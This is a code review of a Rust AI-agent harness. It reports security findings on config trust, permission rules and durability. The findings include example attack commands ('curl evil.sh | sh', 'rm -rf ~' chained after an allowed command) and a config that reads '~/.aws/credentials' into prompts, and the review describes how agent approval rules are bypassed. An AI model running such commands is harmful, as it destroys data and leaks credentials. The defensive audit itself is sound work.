# Code review — 2026-09-30

Full review of `main` at `93b8291` (35k lines of Rust, 118 files): every non-test source file read, plus automated checks. Goal: a clean base before new feature work.

## Summary

The codebase is in good shape. The architecture rules hold (the approval gate can't be bypassed by construction, core/TUI separation is intact), error handling is disciplined, and test coverage is high. There are no TODOs and no `unsafe`, and production code has only a handful of `unwrap`/`expect` calls, each justified.

The findings that matter most are in **config trust**, **permission rules** and **on-disk durability**. Four of them should be fixed before new work (H1–H4). The rest are medium/low bugs and cleanup.

| Check | Result |
|---|---|
| `cargo test --workspace` | 537 passed, 0 failed, 24 ignored (live tests needing credentials) |
| `cargo clippy -D warnings` | clean |
| `cargo clippy -W pedantic` | 1,550 warnings, almost all `unwrap` in tests; 9 functions over 100 lines; 49 numeric casts — no action needed beyond the long functions |
| `cargo deny check` | advisories, bans, licenses, sources: all ok (duplicate `winnow` versions only) |
| Line coverage (`cargo llvm-cov`) | **86.3%** overall (18,328 lines) |

## High — fix first

### H1. An untrusted project can read any local file into the prompt
`crates/arbe-runtime/src/config/file.rs:57` (`strip_sensitive`), `config/mod.rs:516`

A project's `.arbe/config.toml` can set `prompt = "<path>"`, and `prompt` is not in the trust-strip list. `PromptTemplate::File` accepts absolute paths, so opening an untrusted repo with `prompt = "/home/me/.aws/credentials"` puts that file into the system prompt of every request, sent to the model provider without any approval.

**Fix:** strip `prompt` from untrusted project config (and from its profiles), or only accept a template path that resolves inside the project. Add a `load_from_sources` test.

### H2. Switching provider keeps the previous provider's endpoint and credentials
`config/mod.rs:399-413` (layer), `599-603` (env), special case at `377-383`

A later layer or flag that changes only the provider name (`--provider`, `ARBE_PROVIDER`, a profile with `provider.name`) keeps `base_url`, `headers` and `api_key_env` from lower layers. Example: the global config points `openai_compatible` at a gateway, and the user runs `--provider anthropic`. The Anthropic key (`ANTHROPIC_API_KEY`) is then sent to the gateway's URL. The `grok-subscription` profile already works around exactly this with a one-off `config.base_url = None`.

**Fix:** treat endpoint, headers, key variable/command and model as belonging to the provider. When a layer sets a *different* provider name, reset those from lower layers. This also removes the Grok special case (see Maintainability).

### H3. Wildcard allow rules for `execute` approve chained commands
`crates/arbe-tools/src/rules.rs:91`, `policy.rs:55-63`

`*` matches anything, so `execute(cargo test*)` (the user guide's own example) auto-approves `cargo test; curl evil.sh | sh` and `cargo test && rm -rf ~`. The same goes the other way: deny rules like `execute(git push*)` are bypassed by `cd . && git push` or `git  push`.

**Fix:** for command subjects, refuse to auto-approve when the command contains shell control operators (`;`, `&&`, `||`, `|`, `` ` ``, `$(`, `>`, `<`, newline) unless the pattern itself contains them, and fall back to a prompt instead. Document that command *deny* rules are best-effort, not a security boundary.

### H4. A crash mid-append can later make a session unloadable
`crates/arbe-storage/src/session_store.rs:246-277`, `atomic.rs:37-54`

`read_jsonl` tolerates a torn last line. But `append_line` then writes the next record straight after the torn fragment, with no newline between them, which merges the two into one malformed line.
- **After one more append:** the merged line is last, so it's silently dropped. The turn that was just written is lost.
- **After a second append:** the merged line is no longer last, so loading fails hard. `turns.jsonl`, `in_flight.jsonl` and `compactions.jsonl` all use this path.

Two related problems:
- The doc comment claims earlier lines were "fsynced", but nothing calls `sync`.
- `write_atomic` doesn't fsync the temp file before the rename, and leaks the temp file if the rename fails.

**Fix:** before appending, if the file doesn't end in `\n`, truncate the torn tail (or write a newline first). Fsync appends of committed turns. Fix the doc comment.

## Medium

| # | Where | Problem | Fix |
|---|---|---|---|
| M1 | `arbe-hooks/src/command.rs:108-116`, `registry.rs:64-80` | `CommandHook` writes the whole payload to stdin before reading stdout. A pass-through hook (`cat`, a line-by-line script) with a payload bigger than the pipe buffer (≈4 KB on Windows, 64 KB on Linux) deadlocks until the timeout. Hooks also **fail open**: a `before_tool_execute` hook meant to veto calls that times out or crashes is skipped and the call proceeds. | Write stdin on a separate task while reading output. Add a per-hook `fail = "open" \| "closed"` setting, closed by default for `before_tool_execute`. |
| M2 | `arbe-tools/src/builtin/execute_tool.rs:137-157` | Output is buffered in full until the command exits (up to 300 s): `yes` or `cat` on a huge file can exhaust memory. Truncation to `max_tool_output_chars` happens only afterwards. | Stream stdout/stderr into a capped head+tail buffer (like `processes.rs` does). |
| M3 | `arbe-tools/src/builtin/web.rs:26-32, 95` | `web_fetch` follows redirects, so a per-site rule `web_fetch(https://docs.rs/*)` approves a URL that redirects anywhere, including `localhost` or `169.254.169.254`. | Disable automatic redirects. Follow them manually and re-check each hop against the rules; refuse loopback and link-local addresses unless the user allowed them explicitly. |
| M4 | `arbe-runtime/src/agent/mod.rs:647-670, 682-704, 733-772` | `meta.json` is created and marked open (pid, activity) *before* the provider is built. If building fails (not signed in, missing key, bad URL), an orphaned session is left behind that looks like it crashed. `resume_with` likewise marks a session `Active` before it can fail. | Build the provider first, then create or touch the session. |
| M5 | `arbe-tui/src/lib.rs:181-358`, `src/main.rs:260` | The TUI keeps one event bus across session switches and doesn't filter by session. Late events from a cancelled old turn (stream chunks, `TurnCancelled`) render into the new session. The TUI bus also holds only **256** events (sessions opened through `Harness` get 4,096); if it lags and drops a `ToolApprovalRequested`, no dialog appears and the turn waits until Esc. | A new bus (or a generation counter) per session. Raise the capacity. On `Lagged`, re-check whether an approval or question is still pending. |
| M6 | `src/main.rs:286` | No panic hook: a panic in the TUI thread leaves the terminal in raw mode on the alternate screen. | Install a hook that restores the terminal, then chains to the default hook. |
| M7 | `agent/compaction.rs:39-51` | The compaction trigger compares history with 80% of the **whole** budget, but history only gets what's left after the system prompt, tools and memory. With small contexts it never triggers and truncation silently wins. Example: Ollama has a 4,096-token budget with ≈3k fixed, so history gets ≈1k. | Compare with the history budget (budget − fixed costs − tool definitions). |
| M8 | `agent/turn.rs:555-561`, `arbe-providers/src/ollama.rs:411` | **Likely, needs a live check:** Ollama's `prompt_eval_count` leaves out prompt tokens served from its KV cache, so after the first round calibration sees "actual ≪ estimate" and clamps the factor to 0.5. That doubles the budget in estimator units, and the server then silently truncates at `num_ctx`. | Verify against a live Ollama. If confirmed, don't calibrate from Ollama rounds after the first (or use `prompt_eval_count` only when it's ≥ the estimate). |
| M9 | `config/mod.rs:684-693`, `ollama.rs:25` | Default Ollama budget: 8,192 window − 4,096 output = 4,096 tokens. The coding prompt plus ≈15 tool schemas use ≈3k, which leaves ≈1k for history. This is part of why session `dea99a75` degraded into repetition. | Ask Ollama for a larger `num_ctx` by default (16–32k for modern models), or reserve a smaller share for output locally. Consider offering fewer tools to small models (see the session review: no `task` below some size). |
| M10 | `arbe-mcp/src/bridge.rs:22-39`, `agent/mod.rs:1065-1068` | Qualified MCP names can collide: `foo`+`bar__baz` and `foo__bar`+`baz` both become `foo__bar__baz`, and so do names truncated at 64 chars. The registry silently overwrites one tool. Refreshing server `foo` also deletes server `foo__bar`'s tools, because removal matches on a name prefix. | Remove tools by recorded server ownership, not by prefix. Detect collisions and suffix a short hash. |
| M11 | `arbe-storage/src/atomic.rs:15-27`, used by `write_file` and `edit_file` | Replacing a file with a new temp file drops its permissions: an edited `chmod +x` script loses its executable bit (Unix), and read-only or ACL settings are lost too. | Copy the original's permissions onto the temp file before the rename. |
| M12 | `arbe-providers/src/openai.rs:440-496` | An `{"error": …}` payload sent mid-stream (OpenAI and compatible servers do this on overload) parses as an empty chunk and is ignored. The user then sees the generic "the response ended before it was complete" instead of the real error, and it's never classified as retryable overload. | Detect an `error` field in the chunk and map it through `error_map`. |

## Low

| # | Where | Problem |
|---|---|---|
| L1 | `agent/turn.rs:190, 334-338` | Cancelling during auto-compaction commits a turn with **zero messages** (the user message isn't recorded yet). Record the user message first, or discard empty turns. |
| L2 | `builtin/read_file.rs:151` | `start_line` without `end_line` (or the reverse) silently returns the whole file. Treat a missing bound as the start or end of the file. |
| L3 | `arbe-mcp/src/http.rs:122` | The SSE body is decoded chunk by chunk with `from_utf8_lossy`, so a multi-byte character split across chunks turns into `�`. Reuse `arbe_providers::utf8_buffer`. |
| L4 | `arbe-tui/src/lib.rs:584-599` | Approval timeouts count render-loop iterations, not time, so every keypress burns a tick (scrolling through a plan speeds up its 10-minute timeout). Use an `Instant` deadline. |
| L5 | `arbe-tui/src/lib.rs:775, 1074` | `/tool` with invalid JSON silently runs with `{}`. `/profile` matching is a prefix match, so `/profiles` means "switch to profile `s`". |
| L6 | `arbe-runtime/src/harness.rs:248-273` | Config and user errors (unknown profile, fixed config) are `HarnessError::Internal`, whose hint says "this is a harness bug; please report it". Use `Config`. |
| L7 | `src/cli.rs:257` | The `--headless` conflict message contains 18 stray spaces (lost `\` line continuation). |
| L8 | `config/mod.rs:327` | The untrusted-project warning names `paths::config_dir()` (process `ARBE_HOME`), not the home actually in use, so it's wrong under `--dev-home`. |
| L9 | `arbe-tui/src/lib.rs:802-825` | `swap_in_agent` closes a session while its cancelled turn may still be committing. The commit then marks it `Active` again, leaving a stale open marker. Wait for `!is_busy()` first, as `run` does on exit. |
| L10 | `builtin/processes.rs:323-334` | `process_output` creates the `Notified` future *after* checking for output, so a notification can be missed and the call waits out the full `wait_secs`. Create and enable it before checking. |
| L11 | `builtin/path_guard.rs:87-96` | The symlink check walks up with `metadata`, which follows links, so a dangling link passes as "doesn't exist yet". Not exploitable today (writes replace the link through the atomic rename; reads fail on it), but fragile. Use `symlink_metadata` and refuse links that point outside the project. |
| L12 | `src/print.rs:95`, `processes.rs:441` | `--approve reads` approves every `Low` call, including `process_kill` (not a read) and `task`. Mark `process_kill` `Medium`, or base `reads` on `read_only()`. |
| L13 | `agent/memory.rs:126-131` | `remember` does read-append-write without a lock; two sessions saving at once lose a note. |
| L14 | `arbe-hooks/src/lib.rs:70-71` | The `Hook::run` docs say transforming hooks "must be explicitly permitted by policy". Nothing enforces that. Implement it or fix the doc. |

## Maintainability

**Dead code** (delete, or wire up and document):
- `arbe_core::RuntimeCommand`: no users. The TUI and headless mode call `Agent` directly.
- `arbe_storage::memory_files`: the whole module is unused. `agent/memory.rs` reimplements memory paths with a *different* project-id scheme, so the two already disagree.
- Most of `arbe_storage::paths` (`sessions_dir`, `session_dir`, `skills_dir`, `memory_dir`, `mcp_dir`, `logs_dir`, `instructions_dir`), plus `SessionStore::new()`/`Default` and `read_global_instructions()`. These read `ARBE_HOME` from the process environment, which CLAUDE.md says agent code must not do; keeping them invites misuse.
- `SessionStore::append_event`/`list_events` (`events.jsonl` is documented as reserved), `arbe_tui::register_demo_tool`, `arbe_providers::build_provider` (tests only).
- `HookError::{Panic, Timeout}`, `MemoryError::{ParseFailure, BudgetFailure}`: never constructed.
- `Message::cache_breakpoint`: never set anywhere (Anthropic only uses its automatic breakpoints).
- `builtin::TOOL_NAMES`: stale (missing `web_search`, `ask_user`, `task`, `remember`, `load_skill`, `exit_plan_mode`), used only by a test, and its doc still talks about "a future automatic tool-call parser".
- `SkillScope::SessionLocal` and `merge_skills`'s first argument: always empty.

**Provider-specific knowledge in generic code:**
- `config/mod.rs` hardcodes the `grok-subscription` profile: the name list, `grok_subscription_profile()`, the `base_url` reset, and the `default_model` branch. Make built-in profiles a data table (name, provider, model, prompt, tools) that providers can contribute to. With H2 fixed, the special case goes away.
- `ProviderError::likely_fix` decides by matching message text (`"arbeharness login"`, `"isn't entitled"`). Give sign-in failures their own variant (e.g. `Auth { message, fix: Option<String> }`) so the fix travels with the error.

**Duplication:**
- Shell invocation (`cmd /S /C` / `sh -c`) is written four times: `execute_tool.rs:234`, `arbe-hooks/command.rs:59`, `config/mod.rs:712`, and a variant in `arbe-mcp/stdio.rs:36`. The MCP variant passes args through Rust's quoting to `cmd`, which is exactly the quoting bug the others work around. Use one helper.
- Two SSE decoders (`arbe_providers::sse`, `arbe_mcp::http::SseDecoder`) and several copies of `read_optional`.

**Misplaced doc comments.** Doc text attached to the wrong item, which rustdoc shows on the wrong item:
- `agent/mod.rs:225-237` (`build_system_prompt`'s doc sits on `struct SystemPrompt`)
- `config/mod.rs:957-962` (`default_model`'s doc sits on `GROK_SUBSCRIPTION_PROFILE`)
- `arbe-skills/src/loader.rs:8-14`
- `agent/tools.rs:48-50`

**Other:**
- **Repeated token estimation:** estimates are recomputed four or five times per request (pipeline, `select_kept`, `measure_messages`, the total), and each pass re-serializes every tool call's JSON input. Cache the cost per `HistoryEntry`; it matters for long sessions.
- **Two "compaction" mechanisms:** `memory_strategy = "compact_summary"` turns on *both* the real LLM compaction and the placeholder `CompactWithSummaryStrategy` ("[compacted: N messages omitted]"). Rename or remove the placeholder.
- **Nested instructions use `subject`:** `nested_instructions` keys off `ToolExecutor::subject`, which is a command line for `execute` and a URL for `web_fetch`. It works by accident (those paths don't exist). Add an explicit `path()` hook.
- **Long functions:** `config::RuntimeConfig::apply` (177 lines), `load_from_sources`, `Agent::assemble`, the TUI's `drain_runtime_events`/`handle_key`, `approve_call`, and `model_loop` are all over 100 lines and are the hardest places to change safely.
- **Out-of-date docs (CLAUDE.md):** it still describes MCP tool keys as `server_name/tool_name` (now `server__tool`) and describes `memory_files` as the memory reader (unused).

## Coverage

Coverage by crate (lines, including in-file test modules):

| Crate | Lines | Covered |
|---|---|---|
| arbe-memory | 880 | 98.5% |
| arbe-hooks | 281 | 97.5% |
| arbe-skills | 267 | 94.4% |
| arbe-tools | 2,949 | 93.3% |
| arbe-runtime | 4,818 | 93.1% |
| arbe-providers | 3,705 | 92.7% |
| arbe-core | 633 | 91.9% |
| arbe-mcp | 957 | 91.0% |
| arbe-storage | 575 | **79.0%** |
| arbeharness (bin) | 1,157 | **66.4%** (`print.rs` 0%, `main.rs` 4%) |
| arbe-tui | 2,106 | **51.2%** (`lib.rs` 30%, `ui.rs` 35%) |

Gaps worth closing, most valuable first:
1. **Subagent tool narrowing** (`subagent.rs:127-140`, uncovered): the "never more tools than the parent" rule has no test. It's a security property.
2. **Storage failure paths** (`session_store.rs`: corrupt/torn lines, Io errors): needed anyway for H4.
3. **Config trust**: tests for H1/H2 (a project `prompt` stripped, provider switch resets endpoint).
4. **Rules with shell operators** (H3), and the approval policy with chained commands.
5. **`--print`**: `tests/cli.rs` only covers `--print` in an ignored live test. Add one against a fake provider (the `Harness` builder already supports `register_provider`) covering the exit codes and `--approve`.
6. **TUI event handling**: `drain_runtime_events` and `handle_key` are pure over `App`. Test them with synthetic events (session swap, lag, approval flow) without a terminal.
7. **`path_guard`**: its error branches (`path_guard.rs:81-108`) are uncovered.

## Suggested order

1. **Security and durability:** H1, H2 (with the built-in-profile table), H3, H4, M1, M3. One commit each, each with the tests listed above.
2. **Correctness:** M2, M4, M5, M6, M10, M11, M12, L1, L2.
3. **Small models / context:** M7, M8 (verify first), M9, together with the fixes from the `dea99a75` session review (tool calls written as text with a wrong tool name).
4. **Cleanup:** the dead code, the shared shell helper, the `likely_fix` variant, the doc comments, CLAUDE.md, and the low-severity list.
